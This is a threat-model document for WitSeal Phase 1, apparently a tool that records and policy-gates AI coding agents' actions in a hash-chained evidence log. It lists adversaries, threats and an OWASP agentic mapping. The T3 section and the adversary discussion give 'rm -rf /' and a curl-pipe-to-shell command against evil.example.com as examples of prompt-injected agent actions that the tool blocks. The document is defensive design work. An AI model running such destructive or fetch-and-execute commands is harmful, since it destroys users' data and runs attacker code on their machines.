# Threat Model — WitSeal Phase 1

Status: Draft, version-pinned to v0.1
Date: 2026-05-08

This document states explicitly **what WitSeal Phase 1 defends against** and **what it does not**. It is paired with the public roadmap so users can map the limitations to the phase that addresses each.

The intended audience is security engineers evaluating WitSeal for adoption, and contributors deciding which threats to prioritize for Phase 2+.

---

## 1. The high-level claim

WitSeal Phase 1 makes AI-coding-agent actions verifiable on a single developer machine. Every action that passes through `witseal exec` produces a hash-chained witness event and a receipt. The chain is replayable. Tampering by a non-producer is detectable.

Three things WitSeal Phase 1 explicitly does **not** claim:

- It is not a defense against a malicious producer (the local user).
- It is not a defense against the AI model itself being subverted (prompt injection, jailbreak).
- It is not a sandbox.

These are honest limitations, not deficiencies, and Phases 5 and beyond address them.

---

## 2. Adversary model

WitSeal Phase 1 considers four classes of adversary. The protection level differs across them.

| Adversary | Capabilities | Phase 1 protection |
|---|---|---|
| **A1 — Compromised model output** | Sends actions WitSeal mediates | Strong: actions classified, evaluated, optionally denied |
| **A2 — Non-producer tamperer** | Modifies an exported evidence package or a copy of the chain | Strong: chain re-verification detects modification |
| **A3 — Malicious producer** | Has full filesystem access on the machine running WitSeal | None in Phase 1; deferred to Phase 5 (Sigstore + Rekor) |
| **A4 — Subprocess escape** | A subprocess WitSeal spawned escalates beyond captured I/O | Partial: argv recorded, top-level I/O captured, but no syscall mediation; deferred to Phase 5 (kernel-level interposition) |

**A1 (compromised model output)** is the wedge. Phase 1 shines here. A coding agent that has been prompt-injected to run `rm -rf /` is denied by the destructive-block policy pack; the attempt is recorded as evidence; the producer's machine is unharmed.

**A2 (non-producer tamperer)** is the secondary wedge. The hash chain ensures that an evidence package cannot be modified silently in transit. Verification is local, offline, and requires no third party.

**A3 (malicious producer)** is the major Phase 1 limitation. The producer holds all keys, owns the filesystem, and can rewrite the entire chain consistently. Phase 5 introduces Sigstore-based signing through Fulcio (keyless, OIDC-bound) and inclusion in the Rekor transparency log; after that, even the producer cannot rewrite the chain without the rewrite being publicly visible in Rekor.

**A4 (subprocess escape)** is the secondary Phase 1 limitation. WitSeal spawns subprocesses via Node's `child_process.spawn` with explicit argv. It captures stdout, stderr, exit code, and argv exactly. It does **not** observe what the subprocess does internally — file writes, network calls, fork-exec children. A subprocess that writes 50 files is recorded as one action; the set of files modified is not enumerated. Phase 5 introduces eBPF/ptrace-based kernel-level mediation on supported platforms.

---

## 3. Threats — explicit list

For each threat, this section states the Phase 1 posture: **mitigated**, **partially mitigated**, **out of scope**, or **deferred to Phase N**.

### T1. Silent tampering of an evidence package in transit

**Description:** A non-producer (intermediary, attacker on the network, malicious copy operation) modifies events or receipts after export.

**Posture:** **Mitigated.** Re-running `verifyChain` over the events detects any modification. The failure points to the exact tampering index.

### T2. Producer rewriting the chain after the fact

**Description:** The local user, or malware running with user privileges, rewrites the entire event log, recomputing hashes consistently from genesis.

**Posture:** **Out of scope in Phase 1. Deferred to Phase 5.** Resolution: Sigstore Cosign signing + Rekor transparency log inclusion. After Phase 5, a rewrite would either require forging a Rekor entry (impractical, public log) or refusing to sign (visible absence).

### T3. Agent proposing an unauthorized action

**Description:** A prompt-injected or otherwise compromised agent proposes an action like `rm -rf /` or `curl https://evil.example.com/exfil.sh | sh`.

**Posture:** **Mitigated by policy.** With the `block-destructive` and `no-network-egress` policy packs loaded, both are denied. The denials are recorded. With permissive policy, the action passes through but is fully recorded as evidence — a producer-side audit can detect it.

### T4. Prompt injection at the model layer

**Description:** A document fed to the agent contains instructions that subvert the agent's reasoning.

**Posture:** **Out of scope.** WitSeal evaluates *what* an action does, not *why* the agent proposed it. The model layer requires its own defenses (e.g., Pillar Security, Prompt Security, Microsoft AGT for goal-hijack detection). WitSeal pairs naturally with these, addressing different layers.

### T5. Subprocess writing files outside its captured stdout

**Description:** A shell command (e.g., `npm install`) that policy permits writes hundreds of files. WitSeal records that the command ran, not the files it touched.

**Posture:** **Partially mitigated. Deferred to Phase 5 for full coverage.** Phase 1 captures argv, exit code, and bounded stdout/stderr — sufficient to identify what was attempted but not exhaustive about side effects. Mitigation in Phase 1: write deny-by-default policies for actions known to have broad filesystem effects.

### T6. Unrecorded approval

**Description:** A high-risk action proceeds without a recorded approval (someone "yes-spammed" through a prompt).

**Posture:** **Mitigated.** Every approval produces an `ApprovalRecord` sealed into the witness event. The principal type (`human` vs `ci`) is recorded. Auditors can distinguish careless click-through from explicit confirmation by examining timestamps (`prompted_at` to `resolved_at` deltas — a 50ms approval is suspicious).

### T7. Default-allow on timeout

**Description:** A required approval times out and the action proceeds anyway.

**Posture:** **Mitigated by design in non-TTY modes; documented limitation in TTY mode (P1-6, runtime-boundary audit 2026-05-25).**

- **CI mode (non-interactive, `WITSEAL_NON_INTERACTIVE=1` or non-TTY stderr):** the approval gate resolves immediately without waiting — auto-approval via the `WITSEAL_AUTO_APPROVE` allow-list or rejection otherwise. No timeout race exists; the gate is functionally synchronous.
- **Callback mode (`WITSEAL_APPROVAL_MODE=callback`):** stub for Phase 1; returns `timed_out` immediately and surfaces "not implemented in v0.1" to stderr.
- **TTY mode (default in interactive sessions):** uses a synchronous blocking `readSync('/dev/tty')`. **The `timeout_seconds` value is informational and not enforced as an OS-level deadline in Phase 1.** The blocking read remains pending until the operator types a character or sends EOF; the runtime cannot interrupt the syscall portably without raw-mode + select/poll wiring that Phase 1 deliberately defers. The prompt UX flags this with `(no timer — Ctrl+C to cancel)` so operators are not misled into expecting auto-timeout.

**Residual:** an operator who leaves a TTY approval prompt unattended in a session where the parent process holds the chain lock keeps that lock until input arrives or the parent process is killed. Phase 2 introduces `select()`-based timeout handling for TTY mode; until then, the public claim is **"silence is not consent in CI"** (true) but **NOT "approval timeout is enforced for TTY"** (false; explicitly removed from public artifacts per the 2026-05-25 claim-discipline list).

### T8. Forged receipt

**Description:** An attacker fabricates a receipt with a plausible-looking content but incorrect hash linkages.

**Posture:** **Mitigated.** Receipt verification (`verifyReceipt`) checks all internal hash references against the witness event. A fabricated receipt fails one of: `classified_intent_hash`, `policy_decision_hash`, `execution_result_hash`, or `receipt_hash` self-check.

### T9. Replay-time policy drift

**Description:** A reviewer replays an old evidence package using current policies. The current policy disagrees with the historical decision; the reviewer is misled.

**Posture:** **Mitigated.** Evidence packages embed the full content of policy packs that were active at chain time. Replay uses those, not current policies. The same-input/same-output property holds.

### T10. Side-channel inference of policy structure

**Description:** Timing differences in policy evaluation reveal which rules matched.

**Posture:** **Out of scope.** Phase 1 does not have constant-time policy evaluation. Threat is low: the attacker would need to be the agent itself, but the agent already sees the decision and reason. Reconsider if Phase 6+ introduces remote evaluation where the requester does not see the rule details.

### T11. Concurrent writers corrupting the chain

**Description:** Two `witseal exec` invocations run simultaneously, race on the chain head, produce a corrupted log.

**Posture:** **Mitigated on all supported runtimes.** Node 24+ uses native `fs.flockSync`; Node 20–23 uses an equivalent fail-closed lockfile shim (ADR-0006). Both enforce single-writer-per-segment.

- **Native path (Node 24+):** single-writer-per-chain enforced by `fs.flockSync`; the OS auto-releases the lock on process exit (even `SIGKILL`). Recursive invocation (WitSeal calling WitSeal) is handled via `WITSEAL_LOCK_HELD_BY_PID`.
- **Lockfile shim (Node 20–23 — the correct default):** an atomic `O_CREAT|O_EXCL` lockfile holding `{pid, startTime}` provides the same mutual exclusion. A held lock is stolen ONLY when the holder is *provably dead* (no such pid, or a reused pid whose process start-time differs from the recorded one); any uncertainty fails closed — never two writers. A crashed holder leaves an orphaned lockfile (no OS auto-release); it is cleared by `witseal unlock`, which applies the same provably-dead test. See `src/integrity/lock.ts`, `tests/integrity-lock.test.ts`, and `tests/lock-concurrency.test.ts` (cross-process: zero-lost-update concurrency, crash recovery, live-holder no-steal, real-event chain integrity).
- **Operator-explicit advisory-only mode:** `WITSEAL_UNSAFE_LOCKLESS=1` opts OUT of locking entirely (advisory) for read-only or networked data dirs accepted at the operator's risk. The first acquire emits a visible `WARNING` to stderr. This is NO LONGER required for normal operation on Node 20–23 — the shim is the correct default; the opt-out only disables it.

**Residual:** the flock and lockfile backends do not coordinate, so concurrent writers to one segment must run under the same Node major (documented limitation, ADR-0006) — the same class of constraint as networked filesystems. An operator who sets `WITSEAL_UNSAFE_LOCKLESS=1` in a multi-writer deployment is unprotected against this threat; the env var is the evidence-chain entry for that opt-out.

### T12. Crash mid-append

**Description:** Process is killed between the `write` syscall and the `fsync`. Log file is shorter than the in-memory chain head expected.

**Posture:** **Mitigated.** On startup, the runtime reads the log tail and recomputes the chain head. Mismatch between cached head and recomputed head triggers a recovery rebuild. If integrity cannot be verified, the runtime starts in read-only mode and surfaces the error explicitly.

### T13. Tampering with WitSeal binary

**Description:** A user's WitSeal install is replaced with a modified binary that produces fake-but-internally-consistent evidence.

**Posture:** **Out of scope at runtime; mitigated at install via Sigstore verification.** Each release is Cosign-signed; users verify the signature before installing. After install, runtime self-verification is not provided in Phase 1 — that would require hardware-attested execution (Phase 5+ TEE integration).

### T14. Supply-chain compromise of dependencies

**Description:** A WitSeal dependency is compromised at npm.

**Posture:** **Partially mitigated.** Dependencies are minimal (Phase 1: `commander`, `zod`, plus a few dev tools). SBOM is published with each release. Reproducible builds + dependency pinning are Phase 5 deliverables. The OWASP ASI04 (Agentic Supply Chain Vulnerabilities) item maps here — WitSeal's small surface area makes this manageable but not resolved.

---

## 4. Mapping to OWASP Top 10 for Agentic Applications (December 2025)

For each ASI item, what WitSeal Phase 1 addresses:

| ASI | Description | WitSeal Phase 1 |
|---|---|---|
| ASI01 | Agent Goal Hijack | **Out of scope.** Model-layer defense; pair with prompt-injection-aware gateway |
| ASI02 | Tool Misuse & Exploitation | **Mitigated.** Policy-driven mediation; deny-by-default for high-risk tools |
| ASI03 | Identity & Privilege Abuse | **Partially mitigated.** Recording present; identity layer (token minting) deferred to integrations like Strata |
| ASI04 | Agentic Supply Chain Vulnerabilities | **Partially mitigated.** SBOM + signed releases; reproducible builds Phase 5 |
| ASI05 | Unexpected Code Execution | **Mitigated.** Subprocess capture, argv recording, deny-by-default for destructive shells |
| ASI06 | Memory & Context Poisoning | **Out of scope.** Model/orchestration-layer concern |
| ASI07 | Insecure Inter-Agent Communication | **Mitigated for receipt-passing.** Cross-agent trust via shared schemas; full federation Phase 6 |
| ASI08 | Cascading Failures | **Out of scope in Phase 1.** Phase 4+ may add circuit-breaker semantics |
| ASI09 | Human-Agent Trust Exploitation | **Partially mitigated.** Approval records prevent silent overrides; UX for approval is conservative |
| ASI10 | Rogue Agents | **Mitigated for governed agents.** A rogue agent cannot bypass WitSeal because the runtime mediates execution — but a rogue agent that doesn't go through WitSeal at all is uncovered (this is the integration responsibility of the user) |

The honest claim: **WitSeal Phase 1 directly addresses ASI02, ASI03, ASI05, ASI07, ASI09, and ASI10.** It does **not** address ASI01, ASI06, or ASI08, and only partially addresses ASI04. Documenting that explicitly is itself a security posture.

---

## 5. What changes by Phase

| Threat | Phase 1 | Phase 5 (integrity hardening) | Phase 6 (remote witness) |
|---|---|---|---|
| T2 — Producer rewrite | out of scope | mitigated (Sigstore + Rekor) | mitigated (federated witnesses) |
| T5 — Subprocess side-effects | partial | mitigated (eBPF/ptrace on Linux) | unchanged |
| T13 — Binary tampering | mitigated at install | mitigated at runtime (TEE attestation) | unchanged |
| T14 — Supply chain | partial | mitigated (reproducible builds + SLSA Build Level 3) | unchanged |

---

## 6. Reporting findings

Vulnerabilities in this threat model — gaps not listed here, or claims here that are wrong — should be reported per `SECURITY.md`. The threat model is itself a versioned document; updates to it will be tracked in commit history.

---

## 7. Reading list

For evaluators new to the agent governance space:

- *Auditable Agents* (arXiv:2604.05485) — the academic framing for pre-execution mediation with tamper-evident records
- OWASP Top 10 for Agentic Applications (genai.owasp.org) — the December 2025 list referenced above
- *Sigstore: Software Signing for Everybody* (Newman et al.) — the keyless signing model used in Phase 5
- *In-Toto: Providing Farm-to-Table Guarantees for Bits and Bytes* — the attestation model behind SLSA provenance
